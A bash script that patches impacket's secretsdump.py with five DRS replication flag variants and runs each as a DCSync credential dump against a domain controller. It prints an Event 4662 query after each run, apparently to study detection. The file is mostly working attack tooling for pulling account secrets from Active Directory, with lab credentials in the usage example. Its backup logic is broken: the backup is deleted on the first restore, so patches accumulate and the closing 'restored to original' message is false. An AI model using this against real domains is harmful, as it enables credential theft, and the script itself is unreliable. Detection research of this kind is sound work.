#!/usr/bin/env bash
#
# run_variants.sh — patch impacket secretsdump.py to test DRS variant flags
#
# This script modifies the DRSGetNCChanges flags in impacket's secretsdump.py
# (tested against 0.13.1), runs secretsdump against a target DC, and restores
# the original file. Each variant changes ulFlags (line 646) and/or
# ulExtendedOp (line 649).
#
# Usage:
#   ./run_variants.sh <secretsdump_path> <target> <domain/user:password> <dc-user>
#
# Example:
#   ./run_variants.sh ~/.local/bin/secretsdump.py 'WINDOMAIN/Administrator:vagrant@192.168.50.227' vagrant
#
# The script is idempotent: if interrupted mid-run, the original file can be
# restored manually from the .pre-variant-tester.bak backup created before
# any patches are applied.
#
# Variants:
#   V1  Baseline       INIT_SYNC | WRIT_REP,       EXOP_REPL_OBJ     (unpatched)
#   V2  No WRIT_REP     INIT_SYNC,                 EXOP_REPL_OBJ
#   V3  SPECIAL_SECRET  INIT_SYNC | SPECIAL_SECRET_PROCESSING,   EXOP_REPL_OBJ
#   V4  REPL_SECRETS    INIT_SYNC,                 EXOP_REPL_SECRETS
#   V5  Full REPL_SEC   INIT_SYNC | WRIT_REP,      EXOP_REPL_SECRETS

set -euo pipefail

SD_PY="${1:?Usage: $0 <secretsdump.py path> <target> <dc-user>}"
TARGET="${2:?}"
DC_USER="${3:?}"

# Find the impacket library secretsdump.py (the one that gets imported, not the wrapper)
# This is typically under site-packages/impacket/examples/secretsdump.py
# The user provides the wrapper; we locate the library file.
IMPORTED_SD=""
for candidate in \
    "$(dirname "$SD_PY")/../../../impacket/examples/secretsdump.py" \
    "$(python3 -c "import impacket.examples; import os; print(os.path.dirname(impacket.examples.__file__))" 2>/dev/null)/secretsdump.py" \
    "$(python3 -c "import importlib.util, os; spec=importlib.util.find_spec('impacket.examples.secretsdump'); print(spec.origin if spec and spec.origin else '')" 2>/dev/null)"; do
    if [ -n "$candidate" ] && [ -f "$candidate" ]; then
        IMPORTED_SD="$candidate"
        break
    fi
done

if [ -z "${IMPORTED_SD:-}" ]; then
    echo "ERROR: Could not locate impacket/examples/secretsdump.py"
    echo "Tried:"
    echo "  - Derived from wrapper script path"
    echo "  - import impacket.examples"
    echo "Ensure impacket 0.13.1 is installed and secretsdump.py works."
    exit 1
fi

echo "[*] Found impacket secretsdump.py: $IMPORTED_SD"

# Line numbers for 0.13.1 — verified against test-execution-log.md
LINE_FLAGS=646
LINE_EXTOP=649

BACKUP="${IMPORTED_SD}.pre-variant-tester.bak"

#############################################################################
# Helper functions
#############################################################################

create_backup() {
    if [ ! -f "$BACKUP" ]; then
        cp "$IMPORTED_SD" "$BACKUP"
        echo "[*] Backup created: $BACKUP"
    else
        echo "[*] Using existing backup: $BACKUP"
    fi
}

restore() {
    if [ -f "$BACKUP" ]; then
        cp "$BACKUP" "$IMPORTED_SD"
        echo "[*] Restored secretsdump.py from backup"
        rm -f "$BACKUP"
    fi
}

patch_flags() {
    local pattern="$1"
    sed -i "${LINE_FLAGS}s/.*/${pattern}/" "$IMPORTED_SD"
}

patch_extop() {
    local pattern="$1"
    sed -i "${LINE_EXTOP}s/.*/${pattern}/" "$IMPORTED_SD"
}

run_secretsdump() {
    local label="$1"
    echo ""
    echo " [$label]"
    echo "-----------------------------------------------------------"
    python "$SD_PY" -just-dc-user "$DC_USER" "$TARGET" 2>&1 || true
    echo "-----------------------------------------------------------"
    echo "  Run on DC to check Event 4662:"
    echo "  wevtutil qe Security /q:\"*[System[EventID=4662]]\" /c:10 /rd:true /f:text | findstr GUID"
}

#############################################################################
# Main
#############################################################################

create_backup

# V1 — Baseline (no patch needed — this is vanilla secretsdump)
restore   # ensure we start from clean state
run_secretsdump "V1-BASELINE: INIT_SYNC|WRIT_REP, EXOP_REPL_OBJ"
sleep 2

# V2 — No DRS_WRIT_REP
restore
patch_flags "request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC  # NO DRS_WRIT_REP"
run_secretsdump "V2-NO-WRIT_REP: INIT_SYNC only, EXOP_REPL_OBJ"
sleep 2

# V3 — DRS_SPECIAL_SECRET_PROCESSING
restore
patch_flags "request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_SPECIAL_SECRET_PROCESSING"
run_secretsdump "V3-SPECIAL_SECRET: INIT_SYNC|SPECIAL_SECRET_PROCESSING, EXOP_REPL_OBJ"
sleep 2

# V4 — EXOP_REPL_SECRETS, no WRIT_REP
restore
patch_flags "request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC  # NO DRS_WRIT_REP"
patch_extop "request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_SECRETS"
run_secretsdump "V4-REPL_SECRETS: INIT_SYNC only, EXOP_REPL_SECRETS"
sleep 2

# V5 — Full baseline + EXOP_REPL_SECRETS
restore
patch_flags "request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP"
patch_extop "request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_SECRETS"
run_secretsdump "V5-REPL_SECRETS_FULL: INIT_SYNC|WRIT_REP, EXOP_REPL_SECRETS"
sleep 2

# Final restore
restore
echo ""
echo "[*] All variants complete. secretsdump.py restored to original."
